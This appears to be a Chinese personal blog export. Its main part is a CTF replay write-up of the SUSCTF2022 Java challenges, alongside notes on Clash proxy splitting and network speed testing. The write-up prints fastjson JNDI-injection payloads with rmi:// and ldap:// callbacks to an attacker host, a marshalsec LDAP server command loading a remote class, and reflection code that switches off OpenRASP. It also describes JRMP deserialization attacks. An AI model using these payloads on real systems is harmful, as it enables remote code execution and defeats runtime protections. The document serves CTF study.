<h3 id="代理流量分流"><a href="#代理流量分流" class="headerlink" title="代理流量分流"></a>代理流量分流</h3><p>Clash是可以运行在路由器上的，所以规则也提供了<code>SRC-IP-CIDR</code>这种类型的规则，我身处的校园网网段是直接一个大的<code>10.0.0.0/8</code>，而开热点是在一个<code>192.168.137.0/24</code>，那么能不能设置一个SRC-IP-CIDR？<br>wireshark启动，抓包，分别抓了WiFi网卡和热点网卡的流量，发现热点网卡上确实显示的是192网段对外部发出了请求，而WiFi网卡上则把这个请求一样是当做本机的请求发出了，显示的是本机10网段上发出的。也就是PC开热点并不能让自己成为一个路由器，而是再进行一层NAT。NAT出来之后还是认为是PC本身发出去，不能通过源IP的形式进行判断</p>
<p>同理，指定进程代理和指定目的地址或目的端口代理也不行。如果Windows的热点是一个单独的进程还好说，目前没找到。Switch通信时的IP因为是P2P类似的模型，不能确认，同样端口也是高位端口随机抽取，所以目的端口也不行。</p>
<h3 id="评论区某不知名大哥的建议"><a href="#评论区某不知名大哥的建议" class="headerlink" title="评论区某不知名大哥的建议"></a>评论区某不知名大哥的建议</h3><p>使用小米随身WiFi时，小米随身WiFi有专门的软件，经过小米WiFi的流量会全部经过这个软件，就可以用proxifier，netch这类的工具直接进行软件的流量代理，做到定向的流量接管，买一个十几块钱，但是还是懒的搞。并且作用也就是将全局代理替换到了固定代理，用处不一定大</p>
<p>找到了一个360免费WiFi，纯软件开热点，可能就能做到小米WiFi的效果而不用买东西？但是360的产品不太放心呢。。。。</p>
<p>用outline全局接管，和Clash感觉没什么区别，不过那个大哥说outline稳定一点？暂时感觉好像没什么区别，clash现在好像也挺稳的</p>
<p>路由器刷固件，应该就很多教程，神仙写的超级固件也功能齐全，自带UDP转TCP伪装加密冗余各种功能，不过我写的Switch简陋自建加速器这一堆东西的初始出发点就是纯软件实现不买东西，所以也就算啦</p>
<h2 id="网速测定"><a href="#网速测定" class="headerlink" title="网速测定"></a>网速测定</h2><p>怎么样来查看自己的机子网络质量如何呢？<br>我现在才发现原来站长之家这么好用。。。<br>可以比较显式的看出来自建的服务器和全国各地的连接情况，能（理论上的）判断自建代理到全国各地联机的流畅情况<br>一个全球ip ping测速，发现我的阿里云小水管到全国各地的网速都不错，到香港日本的速度也不错，不过到美国加拿大那边就不太行了。国内联机的话整体就没什么问题了，好友开个加速器挂香港日本节点应该也不会卡<br>还有一个路由线路追踪，也蛮好用的，比直接traceroute自己一个个查ip舒服多了，唯一缺点就是他提供的起点有限，还是和自己traceroute的路由跳不太一致</p>
<p>综合测定就是阿里云小水管行！服务质量整体靠谱，延迟不错丢包率低，已经不止是能用就行的级别了（就是带宽小了点，不过打个switch小游戏小带宽也能用）</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>NAT</tag>
        <tag>Switch</tag>
        <tag>Clash TUN</tag>
      </tags>
  </entry>
  <entry>
    <title>SUSCTF2022 java复现</title>
    <url>/SUSCTF2022%20java%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="SUSCTF2022-java复现"><a href="#SUSCTF2022-java复现" class="headerlink" title="SUSCTF2022 java复现"></a>SUSCTF2022 java复现</h1><p>为什么我是SUSCTF的出题人加运维还要复现自己的比赛的java呢？<br>因为我是垃圾，不会java，现在开始学（其实是某天晚上想去打D3然后发现已经开赛一小时不能注册然后没事做了）<br>但是出题人说并不想公布环境，所以。我也就不好分享环境了</p>
<p>从运维的角度讲一下这次比赛这两个题反复revenge的情况和出题人的预期解吧</p>
<h2 id="baby-gadget1-amp-revenge"><a href="#baby-gadget1-amp-revenge" class="headerlink" title="baby gadget1 &amp; revenge"></a>baby gadget1 &amp; revenge</h2><p>jdk使用的版本是8u181（上帝视角。感觉做题的时候会有点猜，这个事情赛后也被师傅们吐槽了。。。。），这个版本是LDAP Reference修复的前一个版本，也就意味着JNDI注入即可rce。但是这个题配了openrasp，执行命令会被拦截（然后我再学一下openrasp的配置）</p>
<h3 id="简单的非预期"><a href="#简单的非预期" class="headerlink" title="简单的非预期"></a>简单的非预期</h3><p>这个题在部署环境的时候把fastjson的版本搞成了1.2.46。。。但实际上给的用来提示的lib.zip里却是48。。。但是实际上的依赖确是46，导致直接用48前的通杀payload，绕过openrasp即可。</p>
<p>但是垃圾的我在复现的时候想先换回46，然后测一下非预期，把lib.zip里的fastjson替换之后发现通杀payload打不动。。。然后才发现依赖不是在这里面的，这个完全就是个提示（我那个时候就纳闷怎么还有这种操作就能引入依赖），实际上是在tomcat的webapp的WEB-INF下的lib目录下</p>
<p>但是我菜到连现成的LDAP Ref server都不会用。记一下<br>用的当然是经典<code>marshalsec-0.0.3-SNAPSHOT-all.jar</code><br>先简单的写一个static处的payload类，编译出来，就叫EvilClass.class。放到http服务下，以如下命令启动</p>
<pre class=" language-bash"><code class="language-bash">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://vps/<span class="token comment" spellcheck="true">#EvilClass port</span>
</code></pre>
<p>然后LDAP连接填这个</p>
<pre><code>ldap://vps:port/dsadads
</code></pre>
<p>后面那个路径填啥都无所谓，反正这个server会给你重定向到对应的类上去，就能打通了</p>
<p>实际上就是先访问LDAP服务然后LDAP服务返回了个Reference类告诉你这个类文件在哪然后远程加载，这个过程用的应该是URLClassloader</p>
<p><del>说起来上述原理我应该以前就懂的….</del></p>
<p>这里用BCEL Classloader也行，因为这里的tomcat版本是8.5，jdk版本也比较老，符合BCEL存在的环境（当然仍然是上帝视角）</p>
<p>无论用啥打法，反正发现JNDI注入能用之后其实基本上随便打了</p>
<p>当然也一发打过去给rasp拦了</p>
<h3 id="revenge的非预期"><a href="#revenge的非预期" class="headerlink" title="revenge的非预期"></a>revenge的非预期</h3><p>题目是只给了挖链子所需的依赖的，但实际上还有一些其他的依赖没有给出，为了实现挖出来的新链子能正常反序列化就开了autotype。然后被师傅们搜索过去的历史漏洞给硬生生fuzz出了一个没给出的可以打的依赖，又是一波JNDI注入打通</p>
<p>当然，正常打还是会被rasp拦，和AAA的师傅聊的时候他们说他们打的时候用的python还没输出回显，根本不知道有rasp的存在，所以打半天不知道为什么打不通。。。</p>
<p>这个就是那个没有给出但时间能打的依赖</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="token punctuation">,</span><span class="token property">"AsText"</span><span class="token operator">:</span><span class="token string">"rmi://ip:port/aaa"</span><span class="token punctuation">}</span>
</code></pre>
<p>这里也可以用ldap（理论上来说8u181已经修了rmi来着）</p>
<p>雨了个雨师傅写的fastjson版本探测和出网探测操作<br><a href="http://www.yulegeyu.com/2021/09/22/%E9%82%A3%E4%BA%9B%E5%B9%B4%E4%B8%80%E8%B5%B7%E6%89%93%E8%BF%87%E7%9A%84CTF-Laravel-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86Tricks%E5%88%86%E6%9E%90/">那些年一起打过的CTF-Laravel-任意用户登陆Tricks分析</a><br>这个是一个收集的比较多的fastjson payload<br><a href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson</a></p>
<h3 id="openrasp绕过"><a href="#openrasp绕过" class="headerlink" title="openrasp绕过"></a>openrasp绕过</h3><p>完全不会这个东西，简单搜索教程之后感觉应该是official.js是主要规则配置文件？然后点开一看怎么全是正则。。。不应该是究极函数hook之类的操作吗。好吧，应该究极hook的时候也是用正则去判断的，好感度降低</p>
<p>网上随便找了个文章的绕过方法<br><a href="https://www.anquanke.com/post/id/195016">多种姿势openrasp命令执行绕过</a><br>说实话，这个反射直接把他关了可还行。。。要我说得注意一下别人打到rce之后不能随便关啊，比如至尊SELinux之类的</p>
<pre class=" language-java"><code class="language-java">Object o <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.baidu.openrasp.HookHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Field f <span class="token operator">=</span> o<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"enableHook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Field m <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"modifiers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
m<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>Modifier<span class="token punctuation">.</span>FINAL<span class="token punctuation">)</span><span class="token punctuation">;</span>
f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>19年的文章了现在还能用。。。并且这个关直接全局关了，用完了记得开回去，改回true就行</p>
<p>出题人的预期绕过是用ForkAndExec，似乎是个Unix下的native方法，感觉只能反射调用，参数类型还麻烦的一比。网上复制粘贴的打过去被openrasp拦了。。。。</p>
<p>没要到出题人的exp。。。看到有的师傅说允许发URL请求和读文件，就直接外带flag了，然后我试了一下读文件也没成功。。。是我的问题吗</p>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>预期就是从给的依赖里面摸出来一个新的JNDI注入，为此题目是开了Autotype支持的。然后还上了简单的waf。我觉得能找到链子了这个waf就无所谓了其实，过滤了<code>JTANonClusteredSemaphore</code>这个类名和<code>\\x</code>，JSON还支持\uxxx这种形式，直接绕过即可<br>预期解</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore"</span><span class="token punctuation">,</span><span class="token property">"transactionManagerJNDIName"</span><span class="token operator">:</span> <span class="token string">"rmi://192.168.0.105:1090/ldtnpi"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$[0].transaction"</span><span class="token punctuation">}</span><span class="token punctuation">]</span> 
</code></pre>
<p>然后在已知了预期解的情况下再反过来看看这个链子吧<br>AAA的师傅用了很骚的一招，直接把题目附件里的jar包和原版比对，得到了<code>getTransaction()</code>这个方法被修改过，从原来的protected变成了public，符合了fastjson的利用条件。就直接找到链了<br><a href="https://javadoc.io/doc/org.quartz-scheduler/quartz/latest/index.html">org.quartz.impl.jdbcjobstore.JTANonClusteredSemaphore</a><br>看一下这个函数的代码，直接lookup了。这里的this.transactionManagerJNDIName虽然是private的，但是有对应的setter，也没有问题。但是想从这个茫茫类海里面找到这个玩意又谈何容易呢。想必是有自动化工具之类的东西吧</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Transaction <span class="token function">getTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> LockException <span class="token punctuation">{</span>
        InitialContext ic <span class="token operator">=</span> null<span class="token punctuation">;</span>

        Transaction var3<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            ic <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            TransactionManager tm <span class="token operator">=</span> <span class="token punctuation">(</span>TransactionManager<span class="token punctuation">)</span>ic<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>transactionManagerJNDIName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            var3 <span class="token operator">=</span> tm<span class="token punctuation">.</span><span class="token function">getTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SystemException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LockException</span><span class="token punctuation">(</span><span class="token string">"Failed to get Transaction from TransactionManager"</span><span class="token punctuation">,</span> var12<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var13<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LockException</span><span class="token punctuation">(</span><span class="token string">"Failed to find TransactionManager in JNDI under name: "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>transactionManagerJNDIName<span class="token punctuation">,</span> var13<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ic <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    ic<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> var3<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<h3 id="打一下tomcat-EL"><a href="#打一下tomcat-EL" class="headerlink" title="打一下tomcat EL"></a>打一下tomcat EL</h3><p>当然还有的师傅把这个环境认为是比较高的jdk，所以用的tomcat EL执行命令，本地复现了半天没打上去。。。。</p>
<p>tomcat EL对tomcat的版本有一定的需求，但是tomcat8理论上来说好像没有问题。<br>这个的打法我从印象里应该是用rmi然后用本地factory的打法，如这篇文章所示（以前就看过的）<br><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">Exploitng JNDI Injection In Java</a></p>
<p>但这个玩意本地打的通远程打不通。。。然后问了下做出来的师傅，说是用的javaSerializedData这个字段打本地链打通的。但是用的链还是tomcat EL。我直接疑惑，这个的触发点应该不是readObject吧，之前看的分析文章都是<code>getObjectInstance</code>，怎么也能塞serializedData用反序列化本地链这种打法的。。。<br>翻出来了rouge-jndi试一下。那个师傅用的是这个项目，在rouge-jndi的基础上加了些payload<br><a href="https://github.com/zzwlpx/JNDIExploit">JNDIExploit</a></p>
<p>rouge-jndi本地没打通，远程倒是打通了。。。然后也被rasp拦了，那个师傅用的是加强版的内存马，没给rasp拦住</p>
<p>暂时没能理解为什么反序列化的地方这个玩意也能打通。。。<br>rouge-jndi的作者给出的解释是<code>leads to RCE via unsafe reflection in org.apache.naming.factory.BeanFactory</code></p>
<p>暂时学习一下吧就。。。</p>
<p>然后还有一个奇怪的点，就是这里用的那个eval的语法，写着引擎是js，但是用的都是java代码，但又有些地方是js语法。。。比如变量是没有类型的，统一是var。。。不知道这个的时候我一开始卡了半天</p>
<p>JNDIExploit的作者在代码注释中提到了这一点</p>
<blockquote>
<p>在对代码进行改写时需要注意：<br>① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )<br>② 必须使用全类名<br>③  System.out.println() 需要修改为 print()<br>④  try{…}catch(Exception e){…}  需要修改为 try{…}catch(err){…}<br>⑤  双引号改为单引号<br>⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等<br>⑦  去除类型强转<br>⑧  不能用 sun.misc.Base64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: “sun” is not defined in &lt;eval&gt; at line number 1<br>⑨  不能使用  for(Object obj : objects) 循环</p>
</blockquote>
<p>简单的看了一下调用栈。比较怪的是rmi本地通远程不通，ldap远程通本地不通。</p>
<p>这是rmi的调用栈</p>
<pre><code>org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:216)
javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:332)
com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)
com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
javax.naming.InitialContext.lookup(InitialContext.java:417)
</code></pre>
<p>这个是ldap使用serializedData打ELProcessor的调用栈</p>
<pre><code>org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:216)
javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:194)
com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1113)
com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
javax.naming.InitialContext.lookup(InitialContext.java:417)
</code></pre>
<p>这个是ldap使用打CC链的调用栈</p>
<pre><code>com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:536)
at com.sun.jndi.ldap.Obj.decodeObject(Obj.java:242)
com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1079)
com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
javax.naming.InitialContext.lookup(InitialContext.java:417)
</code></pre>
<p>可以看到打ELProcessor的时候触发的还是<code>getObjectInstance</code>（但为什么结果不同暂且未知），而ELProcessor和CC等反序列化链的区别出现在<code>com.sun.jndi.ldap.LdapCtx</code>中的<code>c_lookup</code>函数中，简单的看了一下就是会先反序列化<code>javaSerializedData</code>，里面塞的是反序列化链的时候直接在<code>decodeObject</code>处反序列化，而ResourceRef包装一下ELProcessor会被正常反序列化出来，之后会走到后面的getObjectInstance再触发。所以即使把ELProcessor塞到serializedData里也能成功利用</p>
<p>（其实就是这里和rmi类似也有这么一步getObjectInstance，怎么都没看见有文章说的。。）</p>
<h2 id="baby-gadget2-amp-revenge"><a href="#baby-gadget2-amp-revenge" class="headerlink" title="baby gadget2 &amp; revenge"></a>baby gadget2 &amp; revenge</h2><p>赛时后面太累了就没管这个题了，我还以为revenge修好了来着，怎么看大伙wp还是非预期。。。</p>
<h3 id="XXE文件读取"><a href="#XXE文件读取" class="headerlink" title="XXE文件读取"></a>XXE文件读取</h3><p>开局登录框抓包发现是xml，打一个xxe。有简单过滤，然后用先知的那篇经典文章的payload打通，给了提示读hint.txt（当然我复现的时候直接对着源码来的，走个流程）<br><a href="https://xz.aliyun.com/t/3357#toc-8">究极xxe汇总</a></p>
<p>这里做的是简单的字符串匹配，所以还可以用之前学过的UTF16编码或者实体编码绕过</p>
<p>虽然我看着源码知道flag的名字，但是外带的时候却外带不出来，明明hint.txt随便读，为什么flag就不行呢</p>
<p>问了下甫舟，说是java高版本之后只能读取单行的文件，读多行文件直接报错，所以读不出来<br>直接搜资料，调试不动了<br><a href="https://www.leadroyal.cn/p/914/">9102年Java里的XXE</a><br>这个师傅id有点眼熟，然后看着他的其他乱七八糟的闲聊看了一个小时。。。。</p>
<p>然后是访问一个zip，zip里面是究极ASM代码。。。就看字符串大概能看出来有一个路由<code>bf2dcf6664b16e0efe471b2eac2b54b2</code><br>会把输入base64decode一下然后放进<code>SafeInputStream</code>，继承了ObjectInputStream，然后还有在resolveClass里面塞了一些黑名单</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SafeInputStream</span> <span class="token keyword">extends</span> <span class="token class-name">ObjectInputStream</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> entry <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> blacklist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"java.util.Hashtable"</span><span class="token punctuation">,</span> <span class="token string">"java.util.HashSet"</span><span class="token punctuation">,</span> <span class="token string">"java.util.HashMap"</span><span class="token punctuation">,</span> <span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">,</span> <span class="token string">"java.util.PriorityQueue"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token function">SafeInputStream</span><span class="token punctuation">(</span>InputStream is<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">resolveClass</span><span class="token punctuation">(</span>ObjectStreamClass des<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>entry <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Set"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"List"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Map"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"Cannot deserialize "</span> <span class="token operator">+</span> des<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>然后说了jdk版本8u191，依赖给了CC 3.1<br>就等于是要找一个新的CC触发点</p>
<p>快进到看flag。flag的意思是找一个jdk的新触发点。显然不会，再来看看当初这个题是怎么被各队非预期的</p>
<h3 id="简单非预期"><a href="#简单非预期" class="headerlink" title="简单非预期"></a>简单非预期</h3><p>绝大多数队都是说用jrmp直接打通的。。。确实黑名单里面没有包含这个来着<br>回忆一下jrmp是怎么打的来着</p>
<p>就是打的RMI，分Client和Listener两种，Client是攻击者起一个服务让受害者连，Listener是受害者起一个服务攻击者打。这里显然得用Client反连。这个攻击的意义和直接反序列化的差距应该就在于多套了一层，这样子就能过一些过滤。比如这里的这堆waf</p>
<p>当然，实际的的绕过意义应该是绕过8u121之后加的JEP290（对RMI中registry在bind的时候被bind恶意对象反序列化的限制，把允许反序列化的类加了白名单，但是实际上对client和server无效，谁知道server和client通信要用什么类，这整个白名单就没法用了），但是我印象里好像再高一点的版本默认不允许localhost以外的机器bind了？（好像是8u141)努力回忆学过的知识ing。。。。</p>
<p>直接yso启动就行。。。但是我好像不是很会yso的exploit模块用法。。。。以前都是<code>java -jar</code>直接输出payload的</p>
<p>exploit模块里面的功能要用<code>java -cp</code>直接指定完全类名，这里是<code>java -cp ysoserial.exploit.JRMPListener</code></p>
<p>然后随便挑个CC7打过去就行了，懒得魔改yso，直接用那个bash -c究极base64打法打的</p>
<h3 id="revenge再次被非预期"><a href="#revenge再次被非预期" class="headerlink" title="revenge再次被非预期"></a>revenge再次被非预期</h3><p>revenge之后对类名进行了限定，在resolveClass中添加了需要类名包含javax的限制。</p>
<p>我一开始还以为这样子就能拦住jrmp了，结果告诉我jrmp发过来的是代理类对象，走的不是resolveClass，而是resolveProxyClass。。。真是闻所未闻，是我浅薄了。找到了一个分析文章（每次都是找文章而不是自己动手。。可能学习效果并不是很好）<br><a href="https://forum.90sec.com/t/topic/599">Java反序列化过程深究</a></p>
<p>readObject大概是这么个调用栈</p>
<pre><code>readObject()
    readObject0()
        readOrdinaryObject()
            readClassDesc()
            switch(tc)
                readNoneProxyDesc()
                    resolveClass()
                        Class.forName()
                readProxyDesc()
                    resolveProxyClass()
                        Proxy.getProxyClass()
</code></pre>
<p>这里会根据反序列化的class的类型在switch处决定进哪个函数，代理类并不会被resolveClass处理，而是有一个单独的resolveProxyClass，导致jrmp并不受新加限制的影响，再次绕过。。。</p>
<p>说起来可能出题人当时也没意识到应该是用resolveProxyClass来防所以又被非预期了。。。</p>
<h3 id="三叶草的非预期"><a href="#三叶草的非预期" class="headerlink" title="三叶草的非预期"></a>三叶草的非预期</h3><p>看了很多wp，但是大伙好像都不是什么预期解。。。三叶草的师傅虽然不是jrmp的非预期，但整体上也不算是预期。。。但又有那么一点预期的感觉。总之就是tql</p>
<p>主要是原因可能是因为他们完全的还原了ASM代码，像我这种大概看懂了在干什么的可能就不会继续看了。。。（因为也不怎么看得懂）</p>
<p>因为只有在entry处会进行一次类的检验，因此只需要随便整个什么可以反序列化且有一个成员变量能接受反序列化payload就行（比如类型直接是Object）<br>反正会递归的readObject，开头过了后面就是裸的反序列化</p>
<p>普通版他们直接整了个ConstantTransformer，直接接受Object类对象。</p>
<p>然后revenge加了个javax的限制之后就从javax里面找了个Attribute类，也有一个成员变量的类型是Object</p>
<h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>从flag内容上能看出来，就是希望能找到一个全新的反序列化入口。这需要对CC链有一定的熟练度。。。。我不太会呜呜，并且怎么找呢</p>
<p>躺会，我是垃圾哈哈哈</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SUSCTF2022 出题笔记</title>
    <url>/SUSCTF2022%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h1 id="SUSCTF2022-出题笔记"><a href="#SUSCTF2022-出题笔记" class="headerlink" title="SUSCTF2022 出题笔记"></a>SUSCTF2022 出题笔记</h1><p>菜狗第一次承办这么大的比赛，人都麻了，呜呜。<br>几天高强度当客服希望能给师傅们带来好一点的体验。相较于较为官方的wp和源码，这个小小的博客记录一下出题的心路历程，以及各种碎碎念（说起来比赛到一半被某个师傅抓包博客了，幸好之前没把这些东西放上去）<br><a href="https://github.com/susers/SUSCTF2022_official_wp">官方wp</a><br><a href="https://github.com/Z3ratu1/my_ctf_challenge/tree/main/SUSCTF2022">我的题目的源码以及部分poc</a></p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>赛宁说要用discord以及与国际接轨，又说一血播报最好是个机器人。就脑袋一拍写了这么个东西。然后比赛全程使用英文，然后我的Chinglish遭到了许多师傅的吐槽。呜呜，因为我的智力条件你也知道.jpg</p>
